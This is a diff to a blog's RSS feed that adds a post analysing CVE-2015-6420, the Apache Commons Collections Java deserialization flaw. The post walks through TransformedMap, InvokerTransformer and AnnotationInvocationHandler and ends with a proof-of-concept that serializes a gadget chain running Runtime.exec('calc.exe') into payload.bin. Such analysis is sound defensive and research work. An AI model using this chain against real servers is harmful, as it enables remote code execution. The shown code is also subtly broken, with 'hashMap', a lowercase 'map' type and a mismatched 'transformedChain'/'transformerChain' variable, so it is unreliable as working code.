@@ -9,8 +9,157 @@
     <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
     <webMaster>zeqiii@163.com (zeqi)</webMaster>
     <copyright>(c) 2016 zeqi</copyright>
-    <lastBuildDate>Mon, 29 Feb 2016 16:34:11 +0800</lastBuildDate>
+    <lastBuildDate>Sat, 05 Mar 2016 19:41:52 +0800</lastBuildDate>
     <atom:link href="https://zeqiii.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Analysis of cve-2015-6420</title>
+      <link>https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/</link>
+      <pubDate>Sat, 05 Mar 2016 19:41:52 +0800</pubDate>
+      <author>zeqiii@163.com (zeqi)</author>
+      <guid>https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/</guid>
+      <description>
+
+&lt;h2 id=&#34;apache-commons-collections:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;Apache Commons Collections&lt;/h2&gt;
+
+&lt;p&gt;Apache Commons Collections implements &lt;code&gt;TransformedMap&lt;/code&gt; whose &lt;code&gt;decorate()&lt;/code&gt; method can perform some operations on a &lt;code&gt;Map&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+    return new TransformedMap(map, keyTransformer, valueTransformer);
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;Transformer&lt;/code&gt; is an implementation to transform an object.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public interface Transformer {
+    public Object transform(Object input);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;Map&lt;/code&gt; has key and value. Parameters of &lt;code&gt;decorate()&lt;/code&gt;, keyTransformer is responsible for the transformation of the keys of a &lt;code&gt;Map&lt;/code&gt;, valueTransformer is responsible for values of a &lt;code&gt;Map&lt;/code&gt;. When a &lt;code&gt;TransformMap&lt;/code&gt; is modified, the method &lt;code&gt;transform()&lt;/code&gt; of keyTransformer or valueTransformer will be invoked.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2015-6420/transform.png&#34; alt=&#34;TransformMap&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;invokertransformer:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;InvokerTransformer&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;InvokerTransformer&lt;/code&gt; is one of the implementation of &lt;code&gt;Transformer&lt;/code&gt;, which can call any method through reflection.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class InvokerTransformer implements Transformer, Serializable {
+...
+    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
+        super();
+        iMethodName = methodName;
+        iParamTypes = paramTypes;
+        iArgs = args;
+    }
+
+    public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        }
+        try {
+            Class cls = input.getClass();
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+            return method.invoke(input, iArgs);
+        } catch (NoSuchMethodException ex) {
+            ...
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Given a method name, parameter types and values, &lt;code&gt;InvokerTransformer&lt;/code&gt; uses reflection in its &lt;code&gt;transform()&lt;/code&gt; method to invoke the corresponding method. So attacker can craft a &lt;code&gt;ChainedTransformer&lt;/code&gt; with several &lt;code&gt;InvokerTransformer&lt;/code&gt; in order to execute a series of commands.&lt;/p&gt;
+
+&lt;p&gt;For example&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] args) throws Exception {
+    Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] {
+            String.class, Class[].class }, new Object[] {
+            &amp;quot;getRuntime&amp;quot;, new Class[0] }),
+        new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] {
+            Object.class, Object[].class }, new Object[] {
+            null, new Object[0] }),
+        new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] {
+            String.class }, new Object[] {&amp;quot;calc.exe&amp;quot;})};
+
+    Transformer transformedChain = new ChainedTransformer(transformers);
+
+    Map innerMap = new hashMap();
+    innerMap.put(&amp;quot;value&amp;quot;, &amp;quot;value&amp;quot;);
+    map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
+    // trigger the invocation of transform()
+    onlyElement.setValue(&amp;quot;foobar&amp;quot;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When &lt;code&gt;setValue()&lt;/code&gt; is executed, it triggers the callback to invoke &lt;code&gt;transform()&lt;/code&gt;. For &lt;code&gt;ChainedTransformer&lt;/code&gt;, it triggers a series of &lt;code&gt;transform()&lt;/code&gt; to be executed. In the example above, it is equivalent to:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;((Runtime)Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;,null).invoke(null,new Object[0])).exec(&amp;quot;calc.exe&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;annotationinvocationhandler:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;AnnotationInvocationHandler&lt;/h2&gt;
+
+&lt;p&gt;To now, we have known that we can craft a &lt;code&gt;TransformedMap&lt;/code&gt; to execute arbitrary code. To archieve our goal, we must find some way to modify the element of  &lt;code&gt;TransformedMap&lt;/code&gt; so that &lt;code&gt;transform()&lt;/code&gt; can be invoked.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt; has a field whose type is &lt;code&gt;Map&lt;/code&gt;. Also, it implements &lt;code&gt;Serializable&lt;/code&gt; and override &lt;code&gt;readObject()&lt;/code&gt;, in which every element of &lt;code&gt;memberValues&lt;/code&gt; invokes &lt;code&gt;setValue()&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;class AnnotationInvocationHandler implements InvocationHandler, Serializable {
+    private final Class&amp;lt;? extends Annotation&amp;gt; type;
+    private final Map&amp;lt;String, Object&amp;gt; memberValues;
+
+    AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; type, Map&amp;lt;String, Object&amp;gt; memberValues) {
+        this.type = type;
+        this.memberValues = memberValues;
+    }
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So, we can initialize an &lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;, set its &lt;code&gt;memberValues&lt;/code&gt; to  our crafted &lt;code&gt;TransformedMap&lt;/code&gt;, then serialize it to get a payload. If the target receives the payload and deserializes it, our code could be executed.&lt;/p&gt;
+
+&lt;h2 id=&#34;poc:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;POC&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] args) throws Exception {
+    Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] {
+            String.class, Class[].class }, new Object[] {
+            &amp;quot;getRuntime&amp;quot;, new Class[0] }),
+        new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] {
+            Object.class, Object[].class }, new Object[] {
+            null, new Object[0] }),
+        new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] {
+            String.class }, new Object[] {&amp;quot;calc.exe&amp;quot;})};
+
+    Transformer transformedChain = new ChainedTransformer(transformers);
+
+    Map innerMap = new hashMap();
+    innerMap.put(&amp;quot;value&amp;quot;, &amp;quot;value&amp;quot;);
+    map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+
+    Class cl = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
+    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+    ctor.setAccessible(true);
+    Object instance = ctor.newInstance(Target.class, outerMap);
+
+    File f = new File(&amp;quot;payload.bin&amp;quot;);
+    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
+    out.writeObject(instance);
+    out.flush();
+    out.close();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;references:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;References&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&#34;&gt;http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
     
     <item>
       <title>Analysis of cve-2014-7911</title>
